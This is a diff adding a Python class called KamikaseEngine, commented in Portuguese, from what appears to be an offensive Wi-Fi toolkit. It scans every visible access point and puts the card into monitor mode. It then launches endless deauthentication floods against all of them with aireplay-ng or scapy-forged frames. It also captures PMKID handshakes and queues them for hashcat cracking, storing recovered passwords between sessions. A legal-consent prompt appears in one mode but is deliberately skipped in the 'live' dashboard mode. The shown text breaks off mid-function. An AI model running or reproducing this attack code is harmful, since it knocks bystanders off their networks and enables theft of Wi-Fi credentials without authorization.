+# ══════════════════ KAMIKASE ENGINE ═══════════════════════════
+# Deauth/Probe/Assoc flood 802.11 INFINITO em todos os APs visíveis.
+# USO LEGAL APENAS — exige --root + autorização explícita digitada.
+
+class KamikaseEngine:
+    """Motor híbrido de DoS 802.11. Discovery via netsh/iw/scapy,
+    monitor mode via airmon-ng/iw, ataque via aireplay-ng/mdk4 com
+    fallback scapy. Contador de pacotes em tempo real, audit log."""
+
+    def __init__(self, ui: TerminalUI, ctx: "ContextoPrivilegio",
+                 detector: "NetworkDetector", live: bool = False):
+        self.ui = ui
+        self.ctx = ctx
+        self.det = detector
+        self.live = live  # modo dashboard C2 (3 zonas drag-drop)
+        self.iface_orig: str = ""
+        self.iface_monitor: str = ""
+        self.alvos: List[Dict[str, Any]] = []
+        self.contador_global = 0
+        self.contador_lock = threading.Lock()
+        self.contador_por_bssid: Dict[str, int] = defaultdict(int)
+        self.start_time: float = 0.0
+        self.stop_event = threading.Event()
+        self.subprocs: List[subprocess.Popen] = []
+        self.threads: List[threading.Thread] = []
+        self.audit_path: Path = Path("kamikase_audit.log")
+        self.encerramento_motivo: str = ""
+        self.driver_info: Dict[str, Any] = {}  # Camada A+B no Windows
+        # Modo --live: estado de zonas + workers
+        self.zonas: Dict[str, List[str]] = {"verde": [], "vermelha": [], "azul": []}
+        self.zonas_lock = threading.Lock()
+        self.deauth_threads: Dict[str, threading.Thread] = {}  # bssid → thread
+        self.deauth_stops: Dict[str, threading.Event] = {}     # bssid → stop
+        self.hashcat_worker: Optional[HashcatWorker] = None
+        self.pmkid: Optional[PMKIDCapture] = None
+        self.memoria = MemoriaPersistente() if live else None
+
+    # ─── API PÚBLICA ─────────────────────────────────────────
+
+    async def run(self):
+        if self.live:
+            return await self._run_live()
+        self.ui.section("KAMIKASE — DEAUTH 802.11 INFINITO")
+        if not priv_ativo():
+            self.ui.error("Kamikase requer --root.")
+            return
+        if not self._validar_pre_requisitos():
+            return
+        if not self._consent_duplo():
+            self.ui.warn("Kamikase cancelado pelo usuário.")
+            return
+        if not await self._descobrir_aps():
+            self.ui.error("Nenhum AP descoberto — abortando kamikase.")
+            return
+        if not self._setup_monitor():
+            self.ui.error("Falha ao configurar modo monitor — abortando.")
+            return
+        self._audit_log_inicio()
+        self.start_time = time.time()
+        self._iniciar_ataques_paralelos()
+        try:
+            await self._loop_ui_live()
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            self.encerramento_motivo = "Ctrl+C"
+        finally:
+            self._encerrar_limpo()
+
+    def resultado(self) -> Dict[str, Any]:
+        duracao = time.time() - self.start_time if self.start_time else 0
+        return {
+            "ativo": True,
+            "alvos": self.alvos,
+            "total_pacotes": self.contador_global,
+            "pacotes_por_bssid": dict(self.contador_por_bssid),
+            "duracao_s": round(duracao, 2),
+            "iface": self.iface_orig,
+            "monitor": self.iface_monitor,
+            "motivo_encerramento": self.encerramento_motivo or "n/a",
+            "audit_log": str(self.audit_path),
+            "zonas": dict(self.zonas) if self.live else {},
+        }
+
+    # ─── MODO --live: dashboard com 3 zonas ──────────────────
+
+    async def _run_live(self):
+        """Modo dashboard: descobre APs, classifica em zona verde, e fica
+        à disposição. Drag-drop no painel chama `mover_para_zona`."""
+        self.ui.section("KAMIKASE C2 LIVE — Dashboard 3 zonas")
+        if not priv_ativo():
+            self.ui.error("Kamikase --live requer --root.")
+            return
+        if not self._validar_pre_requisitos():
+            return
+
+        # Carrega APs já vistos da memória (cross-session)
+        if self.memoria:
+            stats = self.memoria.stats()
+            if stats["total_aps"] > 0:
+                self.ui.success(f"📂 Memória carregada: {stats['total_aps']} APs salvos | "
+                                f"{stats['com_handshake']} com handshake | "
+                                f"{stats['quebradas']} senhas quebradas")
+
+        # Sem consent_duplo no modo live — o dashboard tem aviso visual e drag-drop é deliberado
+        if not await self._descobrir_aps():
+            self.ui.error("Nenhum AP descoberto.")
+            return
+        # Audita cada AP, mescla com memória e popula zona verde
+        for ap in self.alvos:
+            ap.update(WifiSecurityAuditor.auditar(ap))
+            ap["pacotes"] = 0
+            if self.memoria:
+                ap_persistido = self.memoria.registrar_ap(ap)
+                # Restaura senha já quebrada, handshake path, etc.
+                ap.update({k: v for k, v in ap_persistido.items()
+                            if k in ("senha", "quebrada_em", "wordlist_usada",
+                                      "handshake_path", "handshake_em",
+                                      "primeiro_visto", "visitas",
+                                      "historico_zonas")})
+            with self.zonas_lock:
+                self.zonas["verde"].append(ap["bssid"])
+            emitir("ap_descoberto", **ap)
+
+        # Setup monitor mode (só Linux/Termux com --root)
+        if not self._setup_monitor():
+            self.ui.warn("Setup monitor falhou. Algumas operações ficam limitadas.")
+        self._audit_log_inicio()
+        self.start_time = time.time()
+        # Hashcat worker em standby (com referência à memória pra salvar senha)
+        self.hashcat_worker = HashcatWorker(self.ui, memoria=self.memoria)
+        self.hashcat_worker.start()
+        self.pmkid = PMKIDCapture(self.ui, self.iface_monitor or self.iface_orig)
+        # Loop de heartbeat: emite contador de pacotes a cada 1s e dorme
+        try:
+            while not self.stop_event.is_set():
+                await asyncio.sleep(1.0)
+                with self.contador_lock:
+                    total = self.contador_global
+                emitir("pacotes_total", total=total)
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            self.encerramento_motivo = "Ctrl+C"
+        finally:
+            self._encerrar_limpo()
+
+    def remapear_redes(self) -> Dict[str, Any]:
+        """Re-escaneia o ambiente WiFi e adiciona SÓ APs novos.
+        Não duplica APs já conhecidos. Mescla com memória para
+        restaurar senha/handshake de redes já vistas em outras sessões."""
+        self.ui.info("🔄 Remapeando redes (verificação rápida)...")
+        bssids_atuais = {a["bssid"] for a in self.alvos}
+        # Reusa os scanners por motor (sync, sem asyncio)
+        achados: List[Dict[str, Any]] = []
+        try:
+            if self.ctx.motor == "adm":
+                achados = self._scan_aps_windows()
+            elif self.ctx.motor == "root-kali":
+                achados = self._scan_aps_iw()
+            elif self.ctx.motor == "root-termux":
+                achados = self._scan_aps_termux()
+        except Exception as e:
+            self.ui.warn(f"  Scan nativo falhou: {e}")
+        if not achados and HAS_SCAPY:
+            try:
+                achados = self._scan_aps_scapy()
+            except Exception:
+                pass
+
+        novos_aps: List[Dict[str, Any]] = []
+        atualizados = 0
+        for ap in achados:
+            bssid = ap.get("bssid")
+            if not bssid:
+                continue
+            if bssid in bssids_atuais:
+                # Atualiza RSSI e timestamp do AP existente
+                existente = next((a for a in self.alvos if a["bssid"] == bssid), None)
+                if existente:
+                    existente["rssi"] = ap.get("rssi", existente.get("rssi"))
+                    existente["canal"] = ap.get("canal", existente.get("canal"))
+                    if self.memoria:
+                        self.memoria.registrar_ap(existente)
+                    emitir("ap_update", **existente)
+                    atualizados += 1
+                continue
+            # AP novo: audita + mescla com memória
+            ap.update(WifiSecurityAuditor.auditar(ap))
+            ap["pacotes"] = 0
+            if self.memoria:
+                ap_persistido = self.memoria.registrar_ap(ap)
+                ap.update({k: v for k, v in ap_persistido.items()
+                            if k in ("senha", "quebrada_em", "wordlist_usada",
+                                      "handshake_path", "handshake_em",
+                                      "primeiro_visto", "visitas",
+                                      "historico_zonas")})
+            self.alvos.append(ap)
+            with self.zonas_lock:
+                self.zonas["verde"].append(bssid)
+            novos_aps.append(ap)
+            emitir("ap_descoberto", **ap)
+
+        resumo = {
+            "novos": len(novos_aps),
+            "atualizados": atualizados,
+            "total": len(self.alvos),
+            "novos_essids": [a.get("essid", "?") for a in novos_aps][:10],
+        }
+        emitir("rescan_done", **resumo)
+        self.ui.success(f"  ✓ Remap: {resumo['novos']} novas | "
+                        f"{atualizados} atualizadas | total {resumo['total']}")
+        return resumo
+
+    def mover_para_zona(self, bssid: str, destino: str,
+                          perfil: str = "low", wordlist: Optional[str] = None,
+                          contextual: bool = True):
+        """Chamado pelo dashboard via WebSocket quando o usuário arrasta
+        um AP entre zonas. Dispara/encerra ataque deauth ou crack queue."""
+        # Localiza AP e remove de qualquer zona atual
+        with self.zonas_lock:
+            origem = ""
+            for z, lista in self.zonas.items():
+                if bssid in lista:
+                    lista.remove(bssid)
+                    origem = z
+                    break
+            if destino in self.zonas:
+                self.zonas[destino].append(bssid)
+        ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
+        if not ap:
+            return
+
+        # ─── encerra deauth se saiu da zona vermelha ───
+        if origem == "vermelha" and bssid in self.deauth_stops:
+            self.deauth_stops[bssid].set()
+            self.deauth_stops.pop(bssid, None)
+            self.deauth_threads.pop(bssid, None)
+            self.ui.info(f"Deauth encerrado para {bssid}")
+
+        # ─── inicia deauth se entrou na zona vermelha ───
+        if destino == "vermelha":
+            stop = threading.Event()
+            self.deauth_stops[bssid] = stop
+            t = threading.Thread(target=self._loop_deauth_zona,
+                                  args=(bssid, stop), daemon=True,
+                                  name=f"deauth-{bssid}")
+            t.start()
+            self.deauth_threads[bssid] = t
+            self.ui.warn(f"⚡ Deauth iniciado em {bssid} (1 pkt / 0.5s)")
+
+        # ─── enfileira hashcat se entrou na zona azul ───
+        if destino == "azul" and self.hashcat_worker:
+            self._iniciar_crack_async(ap, perfil, wordlist, contextual)
+
+        # Persiste movimentação na memória
+        if self.memoria:
+            self.memoria.registrar_zona(bssid, destino)
+
+        emitir("ap_update", **ap)
+
+    def _loop_deauth_zona(self, bssid: str, stop_event: threading.Event):
+        """Envia 1 frame deauth a cada 0.5s para o BSSID, infinitamente."""
+        try:
+            while not stop_event.is_set():
+                ok = False
+                # Preferência: aireplay-ng -0 1
+                if HAS_AIREPLAY and self.iface_monitor:
+                    try:
+                        cmd = ["aireplay-ng", "-0", "1", "-a", bssid, self.iface_monitor]
+                        if self.ctx.motor == "root-termux":
+                            cmd = ["su", "-c", " ".join(cmd)]
+                        subprocess.run(cmd, timeout=2,
+                                       stdout=subprocess.DEVNULL,
+                                       stderr=subprocess.DEVNULL)
+                        ok = True
+                    except Exception:
+                        ok = False
+                # Fallback scapy
+                if not ok and HAS_SCAPY and self.iface_monitor:
+                    try:
+                        from scapy.all import RadioTap as _RT, Dot11 as _D11, Dot11Deauth as _DD, sendp as _sendp
+                        pkt = _RT()/_D11(addr1="ff:ff:ff:ff:ff:ff",
+                                          addr2=bssid, addr3=bssid)/_DD(reason=7)
+                        _sendp(pkt, iface=self.iface_monitor, count=1, verbose=False)
+                        ok = True
+                    except Exception:
+                        pass
+                if ok:
+                    with self.contador_lock:
+                        self.contador_global += 1
+                        self.contador_por_bssid[bssid] += 1
+                    # Atualiza AP com contador atualizado
+                    ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
+                    if ap:
+                        ap["pacotes"] = self.contador_por_bssid[bssid]
+                        emitir("ap_update", **ap)
+                if stop_event.wait(0.5):
+                    break
+        except Exception as e:
+            self.ui.warn(f"Loop deauth {bssid} caiu: {e}")
+
+    def _iniciar_crack_async(self, ap: Dict[str, Any], perfil: str,
+                              wordlist: Optional[str], contextual: bool = True):
+        """Captura PMKID/handshake do AP e enfileira no hashcat."""
+        bssid = ap["bssid"]
+        self.ui.info(f"🎯 Capturando handshake de {bssid} para crack...")
+
+        def _worker():
+            ap["crack"] = {"status": "capturing", "progresso": 0.0}
+            emitir("ap_update", **ap)
+            pcap = self.pmkid.capturar(bssid, ap.get("canal", 0)) if self.pmkid else None
+            if not pcap:
+                ap["crack"] = {"status": "error", "erro": "captura falhou", "progresso": 0.0}
+                emitir("ap_update", **ap)
+                return
+            # Persiste handshake na memória local (./memoria/handshakes/)
+            if self.memoria:
+                pcap_persistido = self.memoria.registrar_handshake(
+                    bssid, ap.get("essid", ""), pcap)
+                ap["handshake_path"] = str(pcap_persistido)
+                ap["handshake_em"] = datetime.now().isoformat()
+                pcap = pcap_persistido
+            self.ui.success(f"  Handshake/PMKID capturado: {pcap}")
+            wl_path = Path(wordlist) if wordlist else None
+            if wl_path and not wl_path.is_absolute():
+                wl_path = WORDLIST_DIR / wl_path.name
+            self.hashcat_worker.enfileirar(
+                bssid=bssid, essid=ap.get("essid", ""),
+                pcapng=pcap, perfil=perfil, wordlist=wl_path,
+                contextual=contextual)
+
+        threading.Thread(target=_worker, daemon=True,
+                          name=f"capture-{bssid}").start()
+
+    # ─── PRÉ-CHECKS ──────────────────────────────────────────
+
+    def _validar_pre_requisitos(self) -> bool:
+        # Detecta interface WiFi
+        self.iface_orig = self._detectar_iface()
+        if not self.iface_orig:
+            self.ui.error("Nenhuma interface WiFi detectada no sistema.")
+            return False
+        self.ui.info(f"Interface WiFi: {self.iface_orig}")
+
+        # Verifica que pelo menos um motor de ataque está disponível
+        plat = self.ctx.motor
+        if plat in ("root-kali", "root-termux"):
+            if not (HAS_AIREPLAY or HAS_MDK4 or HAS_SCAPY):
+                self.ui.error("Nenhum motor de ataque disponível.")
+                self.ui.info("Instale: apt install aircrack-ng mdk4  OU  pip install scapy")
+                return False
+        elif plat == "adm":
+            if not HAS_SCAPY:
+                self.ui.error("No Windows, kamikase exige Scapy + NPCAP.")
+                self.ui.info("Instale: pip install scapy  + https://npcap.com/")
+                return False
+            # ─── Camada A + B: inspeção do driver Windows ───
+            self.driver_info = self._inspecionar_driver_windows()
+            self._reportar_driver_windows()
+        return True
+
+    def _inspecionar_driver_windows(self) -> Dict[str, Any]:
+        """Camada A: parsea `netsh wlan show drivers` para detectar driver
+        e capabilities. Camada B: cruza nome do driver contra
+        DRIVERS_BLOQUEIAM_INJECTION (lista negra) e DRIVERS_PERMITEM_INJECTION
+        (lista branca informativa).
+
+        Retorna dict com: driver_nome, fornecedor, versao, monitor_listado,
+        bloqueia_conhecido (bool), permite_conhecido (bool), motivo (str)."""
+        info: Dict[str, Any] = {
+            "driver_nome": "?",
+            "fornecedor": "?",
+            "versao": "?",
+            "modos_listados": "",
+            "monitor_listado": False,
+            "bloqueia_conhecido": False,
+            "permite_conhecido": False,
+            "motivo": "",
+            "fonte_motivo": "",
+        }
+        try:
+            saida = subprocess.check_output(
+                ["netsh", "wlan", "show", "drivers"],
+                text=True, errors="ignore", timeout=8)
+        except Exception as e:
+            info["motivo"] = f"Não foi possível executar netsh ({e})."
+            return info
+
+        # Camada A: parse linhas-chave (PT-BR e EN-US)
+        # "Driver" / "Driver"   |   "Fornecedor"/"Vendor"  |  "Versão"/"Version"
+        m = re.search(r"(?:Driver|Driver name)\s*:\s*(.+)", saida)
+        if m:
+            info["driver_nome"] = m.group(1).strip()
+        m = re.search(r"(?:Fornecedor|Vendor)\s*:\s*(.+)", saida)
+        if m:
+            info["fornecedor"] = m.group(1).strip()
+        m = re.search(r"(?:Versão|Version)\s*:\s*(.+)", saida)
+        if m:
+            info["versao"] = m.group(1).strip()
+
+        # "Modos de operação" / "Network types supported" / etc — heurística
+        # ampla porque a saída varia muito entre versões/idiomas.
+        m = re.search(r"(?:Modos de opera[çc]ão|Operation modes|Type)[^:]*:\s*(.+)",
+                       saida, re.IGNORECASE)
+        modos = m.group(1).strip() if m else ""
+        info["modos_listados"] = modos
+        # Confere se a string "Monitor" aparece em qualquer lugar relevante
+        info["monitor_listado"] = bool(re.search(r"\bMonitor\b", saida, re.IGNORECASE))
+
+        # Camada B: cruza com lista negra
+        nome_completo = f"{info['fornecedor']} {info['driver_nome']}"
+        for regex, motivo in DRIVERS_BLOQUEIAM_INJECTION:
+            if re.search(regex, nome_completo, re.IGNORECASE):
+                info["bloqueia_conhecido"] = True
+                info["motivo"] = motivo
+                info["fonte_motivo"] = "lista_negra"
+                break
+        # Cruza com lista branca (informativa, não sobrescreve bloqueio)
+        if not info["bloqueia_conhecido"]:
+            for regex, motivo in DRIVERS_PERMITEM_INJECTION:
+                if re.search(regex, nome_completo, re.IGNORECASE):
+                    info["permite_conhecido"] = True
+                    info["motivo"] = motivo
+                    info["fonte_motivo"] = "lista_branca"
+                    break
+
+        # Se ainda não temos motivo e netsh não listou Monitor → suspeito
+        if not info["motivo"] and not info["monitor_listado"]:
+            info["motivo"] = ("Driver não expõe modo Monitor na saída do netsh — "
+                              "frames podem ser descartados silenciosamente.")
+            info["fonte_motivo"] = "netsh_sem_monitor"
+        return info
+
+    def _reportar_driver_windows(self):
+        """Imprime diagnóstico do driver Windows com cores e veredicto."""
+        info = self.driver_info
+        self.ui.info(f"Driver detectado: {info.get('driver_nome', '?')} "
+                     f"v{info.get('versao', '?')}  ({info.get('fornecedor', '?')})")
+        if info.get("monitor_listado"):
+            self.ui.success("netsh listou modo Monitor — driver provavelmente aceita injection.")
+        else:
+            self.ui.warn("netsh NÃO listou modo Monitor — driver provavelmente bloqueia injection.")
+
+        if info.get("bloqueia_conhecido"):
+            self.ui.error("=" * 64)
+            self.ui.error("⚠ DRIVER NA LISTA NEGRA DE INJECTION 802.11 (Windows)")
+            self.ui.error(f"   {info.get('motivo', '')}")
+            self.ui.error("   Os frames serão enviados pelo scapy mas DESCARTADOS pelo")
+            self.ui.error("   driver antes de chegar à antena. Contador subirá, mas")
+            self.ui.error("   nenhum cliente será desconectado de fato (placebo).")
+            self.ui.error("   Solução: USB adapter Alfa AWUS036NHA / TL-WN722N v1 / Panda PAU09,")
+            self.ui.error("   ou bootar Kali Linux (driver iwlwifi expõe monitor neste mesmo HW).")
+            self.ui.error("=" * 64)
+        elif info.get("permite_conhecido"):
+            self.ui.success(f"Driver na lista branca: {info.get('motivo', '')}")
+        elif not info.get("monitor_listado"):
+            self.ui.warn(info.get("motivo", "Driver de status desconhecido."))
+
+    def _detectar_iface(self) -> str:
+        try:
+            if self.ctx.motor == "adm":
+                # netsh wlan show interfaces
+                saida = subprocess.check_output(
+                    ["netsh", "wlan", "show", "interfaces"],
+                    text=True, errors="ignore", timeout=5)
+                m = re.search(r"Name\s*:\s*(.+)", saida)
+                if m:
+                    return m.group(1).strip()
+            elif self.ctx.motor == "root-kali" and HAS_IW:
+                saida = subprocess.check_output(
+                    ["iw", "dev"], text=True, errors="ignore", timeout=5)
+                m = re.search(r"Interface\s+(\w+)", saida)
+                if m:
+                    return m.group(1)
+            elif self.ctx.motor == "root-termux":
+                # Termux convencionalmente wlan0
+                if os.path.exists("/sys/class/net/wlan0"):
+                    return "wlan0"
+        except Exception:
+            pass
+        # Fallback: tenta wlan0
+        if os.path.exists("/sys/class/net/wlan0"):
+            return "wlan0"
+        return ""
+
+    # ─── CONSENT DUPLO ───────────────────────────────────────
+
+    def _consent_duplo(self) -> bool:
+        # Camada A+B: se driver Windows bloqueia, exige confirmação técnica primeiro
+        bloqueia = bool(self.driver_info.get("bloqueia_conhecido"))
+        sem_monitor = (self.ctx.motor == "adm"
+                        and not self.driver_info.get("monitor_listado", True))
+        if bloqueia or sem_monitor:
+            self.ui.warn("=" * 64)
+            self.ui.warn("PRÉ-CHECK TÉCNICO — driver Windows pode descartar os frames")
+            self.ui.warn("=" * 64)
+            if bloqueia:
+                self.ui.error(f"Driver na lista negra: {self.driver_info.get('driver_nome', '?')}")
+                self.ui.error(self.driver_info.get("motivo", ""))
+            else:
+                self.ui.warn(self.driver_info.get("motivo",
+                             "Driver não expõe modo Monitor."))
+            self.ui.info("")
+            self.ui.info("Você reconhece que o ataque pode ser PLACEBO neste hardware?")
+            self.ui.info("Para tentar mesmo assim, digite EXATAMENTE: FORCAR")
+            try:
+                tecnico = input("  > ").strip()
+            except (EOFError, KeyboardInterrupt):
+                return False
+            if tecnico != "FORCAR":
+                self.ui.warn("Cancelado pelo pré-check técnico.")
+                self.ui.info("Sugestão: rode em Linux/Kali (driver iwlwifi expõe monitor) "
+                             "ou use USB adapter Alfa/TL-WN722N v1.")
+                return False
+            self.ui.warn("Pré-check sobrescrito — prosseguindo mesmo com driver suspeito.")
+
+        # Camada ÉTICA: consent legal idêntico ao original
+        self.ui.warn("=" * 64)
+        self.ui.warn("⚠  KAMIKASE — DEAUTH FLOOD 802.11 EM TODAS AS REDES VISÍVEIS  ⚠")
+        self.ui.warn("=" * 64)
+        self.ui.error("AVISO LEGAL: Operar deauth flood contra rede sem autorização")
+        self.ui.error("explícita do proprietário é CRIME (Lei 12.737/2012 BR; CFAA EUA).")
+        self.ui.error("Esta ferramenta é para PENTEST AUTORIZADO, lab pessoal ou CTF.")
+        self.ui.warn("")
+        self.ui.warn("Você confirma que TODAS as redes WiFi em alcance da sua placa")
+        self.ui.warn("são SUAS ou que você tem AUTORIZAÇÃO ESCRITA do proprietário?")
+        self.ui.info("")
+        self.ui.info("Para confirmar, digite EXATAMENTE: EU AUTORIZO")
+        try:
+            resposta = input("  > ").strip()
+        except (EOFError, KeyboardInterrupt):
+            return False
+        if resposta != "EU AUTORIZO":
+            self.ui.error("Confirmação inválida. Operação cancelada.")
+            return False
+        self.ui.success("Autorização registrada. Procedendo.")
+        return True
+
+    # ─── DISCOVERY DE APs ────────────────────────────────────
+
+    async def _descobrir_aps(self) -> bool:
+        self.ui.info("Descobrindo APs visíveis...")
+        try:
+            if self.ctx.motor == "adm":
+                self.alvos = self._scan_aps_windows()
+            elif self.ctx.motor == "root-kali":
+                self.alvos = self._scan_aps_iw()
+            elif self.ctx.motor == "root-termux":
+                self.alvos = self._scan_aps_termux()
+        except Exception as e:
+            self.ui.warn(f"  Scan via método nativo falhou: {e}")
+        if not self.alvos and HAS_SCAPY:
+            self.ui.info("  Caindo para scapy beacon sniff (8s)...")
+            self.alvos = self._scan_aps_scapy()
+        if not self.alvos:
+            return False
+        rows = [[a.get("essid", "?")[:24], a.get("bssid", "?"),
+                 str(a.get("canal", "?")), str(a.get("rssi", "?"))]
+                for a in self.alvos[:30]]
+        self.ui.table(f"APs Descobertos ({len(self.alvos)})",
+                       [("ESSID", C_CYAN), ("BSSID", C_WHITE),
+                        ("Canal", C_YELLOW), ("RSSI dBm", C_GREEN)], rows)
+        return True
+
+    def _scan_aps_windows(self) -> List[Dict[str, Any]]:
+        try:
+            saida = subprocess.check_output(
+                ["netsh", "wlan", "show", "networks", "mode=bssid"],
+                text=True, errors="ignore", timeout=10)
+        except Exception:
+            return []
+        alvos = []
+        ssid_atual = ""
+        for linha in saida.splitlines():
+            m = re.match(r"\s*SSID\s+\d+\s*:\s*(.*)", linha)
+            if m:
+                ssid_atual = m.group(1).strip()
+                continue
+            m = re.match(r"\s*BSSID\s+\d+\s*:\s*([0-9a-f:]+)", linha, re.I)
+            if m:
+                alvos.append({"essid": ssid_atual or "<oculto>",
+                              "bssid": m.group(1).upper(),
+                              "canal": "?", "rssi": "?"})
+                continue
+            m = re.match(r"\s*Signal\s*:\s*(\d+)%", linha)
+            if m and alvos:
+                pct = int(m.group(1))
+                # Conversão grosseira % → dBm
+                alvos[-1]["rssi"] = -100 + (pct // 2)
+            m = re.match(r"\s*Channel\s*:\s*(\d+)", linha)
+            if m and alvos:
+                alvos[-1]["canal"] = int(m.group(1))
+        return alvos
+
+    def _scan_aps_iw(self) -> List[Dict[str, Any]]:
+        if not HAS_IW:
+            return []
+        try:
+            saida = subprocess.check_output(
+                ["iw", "dev", self.iface_orig, "scan"],
+                text=True, errors="ignore", timeout=15)
+        except Exception:
+            return []
+        alvos = []
+        bssid_atual: Optional[Dict[str, Any]] = None
+        for linha in saida.splitlines():
+            m = re.match(r"BSS\s+([0-9a-f:]+)", linha, re.I)
+            if m:
+                if bssid_atual:
+                    alvos.append(bssid_atual)
+                bssid_atual = {"bssid": m.group(1).upper(), "essid": "<oculto>",
+                               "canal": "?", "rssi": "?"}
+                continue
+            if not bssid_atual:
+                continue
+            m = re.match(r"\s*SSID:\s*(.+)", linha)
+            if m:
+                bssid_atual["essid"] = m.group(1).strip() or "<oculto>"
+            m = re.match(r"\s*signal:\s*(-?\d+\.?\d*)\s*dBm", linha)
+            if m:
+                bssid_atual["rssi"] = float(m.group(1))
+            m = re.match(r"\s*DS Parameter set: channel\s+(\d+)", linha)
+            if m:
+                bssid_atual["canal"] = int(m.group(1))
+            m = re.match(r"\s*\* primary channel:\s+(\d+)", linha)
+            if m:
+                bssid_atual["canal"] = int(m.group(1))
+        if bssid_atual:
+            alvos.append(bssid_atual)
+        return alvos
+
+    def _scan_aps_termux(self) -> List[Dict[str, Any]]:
+        # Tenta termux-wifi-scaninfo (JSON) primeiro
+        try:
+            saida = subprocess.check_output(
+                ["termux-wifi-scaninfo"], text=True, errors="ignore", timeout=10)
+            data = json.loads(saida)
+            return [{"essid": d.get("ssid", "<oculto>"),
+                     "bssid": d.get("bssid", "?").upper(),
+                     "canal": d.get("frequency_mhz", "?"),
+                     "rssi": d.get("rssi", "?")}
+                    for d in data]
+        except Exception:
+            pass
+        # Fallback: su -c "iw dev wlan0 scan"
+        if HAS_SU:
+            try:
+                saida = subprocess.check_output(
+                    ["su", "-c", f"iw dev {self.iface_orig} scan"],
+                    text=True, errors="ignore", timeout=15)
+                # Reusa parser do iw (mesmo formato)
+                return self._parse_iw_scan(saida)
+            except Exception:
+                pass
+        return []
+
+    def _parse_iw_scan(self, saida: str) -> List[Dict[str, Any]]:
+        alvos = []
+        cur: Optional[Dict[str, Any]] = None
+        for linha in saida.splitlines():
+            m = re.match(r"BSS\s+([0-9a-f:]+)", linha, re.I)
+            if m:
+                if cur: alvos.append(cur)
+                cur = {"bssid": m.group(1).upper(), "essid": "<oculto>",
+                       "canal": "?", "rssi": "?"}
+                continue
+            if not cur: continue
+            m = re.match(r"\s*SSID:\s*(.+)", linha)
+            if m: cur["essid"] = m.group(1).strip() or "<oculto>"
+            m = re.match(r"\s*signal:\s*(-?\d+\.?\d*)", linha)
+            if m: cur["rssi"] = float(m.group(1))
+            m = re.match(r"\s*DS Parameter set: channel\s+(\d+)", linha)
+            if m: cur["canal"] = int(m.group(1))
+        if cur: alvos.append(cur)
+        return alvos
+
+    def _scan_aps_scapy(self) -> List[Dict[str, Any]]:
+        if not HAS_SCAPY:
+            return []
+        encontrados: Dict[str, Dict[str, Any]] = {}
+
+        def cb(p):
+            try:
+                if p.haslayer(Dot11Beacon):
+                    bssid = p[Dot11].addr2.upper()
+                    if bssid not in encontrados:
+                        try:
+                            essid = p[Dot11Elt].info.decode(errors="ignore") or "<oculto>"
+                        except Exception:
+                            essid = "<oculto>"
+                        encontrados[bssid] = {
+                            "bssid": bssid, "essid": essid,
+                            "canal": "?", "rssi": "?",
+                        }
+            except Exception:
+                pass
+
+        try:
+            sniff(iface=self.iface_orig, prn=cb, timeout=8, store=False)
+        except Exception:
+            pass
+        return list(encontrados.values())
+
+    # ─── MONITOR MODE ────────────────────────────────────────
+
+    def _setup_monitor(self) -> bool:
+        if self.ctx.motor == "adm":
+            self.iface_monitor = self.iface_orig  # NPCAP injeta direto
+            self.ui.info("Windows: scapy/NPCAP injeta sem mudar para monitor mode.")
+            return True
+        if self.ctx.motor == "root-kali" and HAS_AIRMON:
+            try:
+                saida = subprocess.check_output(
+                    ["airmon-ng", "start", self.iface_orig],
+                    text=True, errors="ignore", timeout=10)
+                # Procura nome da iface monitor
+                m = re.search(r"\[?phy\d+\]?(\w+mon|\w+\d+)", saida)
+                if m:
+                    self.iface_monitor = m.group(1)
+                else:
+                    self.iface_monitor = self.iface_orig + "mon"
+                self.ui.success(f"Modo monitor ativo em: {self.iface_monitor}")
+                return True
+            except Exception as e:
+                self.ui.warn(f"airmon-ng falhou: {e}; tentando iw...")
+        # Fallback iw
+        if HAS_IW:
+            try:
+                cmd_pre = ["ip", "link", "set", self.iface_orig, "down"]
+                cmd_set = ["iw", "dev", self.iface_orig, "set", "type", "monitor"]
+                cmd_up = ["ip", "link", "set", self.iface_orig, "up"]
+                if self.ctx.motor == "root-termux":
+                    cmd_pre = ["su", "-c", " ".join(cmd_pre)]
+                    cmd_set = ["su", "-c", " ".join(cmd_set)]
+                    cmd_up = ["su", "-c", " ".join(cmd_up)]
+                subprocess.run(cmd_pre, timeout=5, check=False)
+                subprocess.run(cmd_set, timeout=5, check=False)
+                subprocess.run(cmd_up, timeout=5, check=False)
+                self.iface_monitor = self.iface_orig
+                self.ui.success(f"Monitor mode (iw) em: {self.iface_monitor}")
+                return True
+            except Exception as e:
+                self.ui.error(f"iw set monitor falhou: {e}")
+        return False
+
+    # ─── ATAQUE ──────────────────────────────────────────────
+
+    def _iniciar_ataques_paralelos(self):
+        self.ui.section("KAMIKASE ENGAGED — Pressione Ctrl+C para encerrar")
+        for alvo in self.alvos:
+            bssid = alvo["bssid"]
+            # Thread por BSSID
+            t = threading.Thread(
+                target=self._atacar_bssid,
+                args=(alvo,),
+                daemon=True,
+                name=f"kami-{bssid}")
+            t.start()
+            self.threads.append(t)
+
+    def _atacar_bssid(self, alvo: Dict[str, Any]):
+        bssid = alvo["bssid"]
+        # Tenta aireplay-ng primeiro (mais confiável)
+        if HAS_AIREPLAY and self.ctx.motor in ("root-kali", "root-termux"):
+            try:
+                cmd = ["aireplay-ng", "-0", "0", "-a", bssid, self.iface_monitor]
+                if self.ctx.motor == "root-termux":
+                    cmd = ["su", "-c", " ".join(cmd)]
+                proc = subprocess.Popen(
+                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                    text=True, errors="ignore")
+                self.subprocs.append(proc)
+                # Lê stdout para contar deauths
+                for linha in proc.stdout:
+                    if self.stop_event.is_set():
+                        break
+                    if "Sending DeAuth" in linha or "Sending Deauth" in linha:
+                        with self.contador_lock:
+                            self.contador_global += 64  # aireplay envia em bursts
+                            self.contador_por_bssid[bssid] += 64
+                return
+            except Exception:
+                pass
+        # Fallback scapy
+        if HAS_SCAPY:
+            self._scapy_deauth_loop(bssid)
+
+    def _scapy_deauth_loop(self, bssid: str):
+        try:
+            from scapy.all import RadioTap as _RT, Dot11 as _D11, Dot11Deauth as _DD, sendp as _sendp
+        except Exception:
+            return
+        pkt_broadcast = _RT()/_D11(addr1="ff:ff:ff:ff:ff:ff",
+                                    addr2=bssid, addr3=bssid)/_DD(reason=7)
+        while not self.stop_event.is_set():
+            try:
+                _sendp(pkt_broadcast, iface=self.iface_monitor,
